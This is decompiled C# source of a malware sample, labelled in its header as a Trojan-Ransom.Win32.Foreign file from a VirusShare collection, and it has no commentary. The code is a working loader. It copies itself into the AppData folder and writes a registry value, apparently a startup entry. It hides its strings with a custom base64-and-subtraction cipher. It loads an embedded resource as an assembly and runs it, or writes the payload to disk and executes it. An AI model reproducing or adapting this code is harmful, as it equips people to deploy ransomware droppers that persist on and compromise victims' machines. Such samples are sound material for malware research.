// Decompiled with JetBrains decompiler
// Type: B7L32620F
// Assembly: Base, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 79266255-A265-45C6-9215-BFEB5D2127D2
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Foreign.mwnp-03c490d0d94e6e4f7258d4d9282f7eda8aeb84853b53f0dff51f2443b3ad4c21.exe

using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Text;
using System.Windows.Forms;

public sealed class B7L32620F
{
  public static void HAP5Y47()
  {
    string destFileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + B7L32620F.\u0033MZU1("dik=", "BS") + B7L32620F.\u0033MZU1("co2BfpGCS4KVgik=", "F");
    string name = B7L32620F.\u0033MZU1("eaGUj5SMS2+dlKGQnSk=", "T");
    try
    {
      File.Copy(Application.ExecutablePath, destFileName, true);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(B7L32620F.\u0033MZU1("fZmQnqGLnI+Gd5ONnJmdmZCehoGTmI6ZoZ2GbZ+cnI+YnoCPnJ2TmZiGfJ+YKQ==", "S"), true);
      registryKey.SetValue(name, (object) destFileName);
      registryKey.Close();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    try
    {
      Assembly assembly = B7L32620F.\u00356Q0AQ;
      B7L32620F.\u00385Y0BE6.Invoke((object) null, (object[]) null);
    }
    catch (Exception ex1)
    {
      ProjectData.SetProjectError(ex1);
      try
      {
        FileStream fileStream = new FileStream(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + B7L32620F.\u0033MZU1("co2BfpGCS4KVgik=", "False"), FileMode.Create);
        fileStream.Write(B7L32620F.O8WVQFJBR, 0, B7L32620F.O8WVQFJBR.Length);
        fileStream.Close();
        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + B7L32620F.\u0033MZU1("co2BfpGCS4KVgik=", "False"));
        ProjectData.EndApp();
      }
      catch (Exception ex2)
      {
        ProjectData.SetProjectError(ex2);
        ProjectData.ClearProjectError();
      }
      ProjectData.ClearProjectError();
    }
    Process.GetCurrentProcess().WaitForExit();
  }

  public static Assembly \u00356Q0AQ => Assembly.Load(B7L32620F.O8WVQFJBR);

  public static object[] VDHOC(object[] O) => O;

  public static byte[] SXM4D7(string _param0)
  {
    Stream manifestResourceStream = Assembly.GetExecutingAssembly().GetManifestResourceStream(_param0);
    byte[] buffer = new byte[(int) (manifestResourceStream.Length - 1L) + 1];
    int count = manifestResourceStream.Read(buffer, 0, (int) manifestResourceStream.Length);
    return new MemoryStream(buffer, 0, count).ToArray();
  }

  public static byte[] O8WVQFJBR => B7L32620F.SXM4D7("L.resource");

  public static MethodInfo \u00385Y0BE6 => B7L32620F.\u00356Q0AQ.EntryPoint;

  public static string \u0033MZU1(string ZIXCSJACB, string Z3FFR)
  {
    string str;
    try
    {
      str = Encoding.UTF8.GetString(B7L32620F.\u0035KY8IRNY2(Convert.FromBase64String(ZIXCSJACB), Encoding.UTF8.GetBytes(Z3FFR)));
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return str;
  }

  public static byte[] \u0035KY8IRNY2(byte[] _param0, byte[] N2IFFL)
  {
    int num1 = (int) _param0[_param0.Length - 1];
    byte[] numArray1 = new byte[_param0.Length - 2 + 1];
    short index1 = 0;
    byte[] numArray2;
    try
    {
      int num2 = _param0.Length - 2;
      for (int index2 = 0; index2 <= num2; ++index2)
      {
        if ((int) index1 >= N2IFFL.Length)
          index1 = (short) 0;
        if (index2 < _param0.Length - 1)
        {
          numArray1[index2] = Convert.ToByte((int) _param0[index2] - numArray1.Length % N2IFFL.Length - (int) N2IFFL[(int) index1] + num1);
          ++index1;
        }
      }
      numArray2 = numArray1;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      numArray2 = numArray1;
      ProjectData.ClearProjectError();
    }
    return numArray2;
  }
}
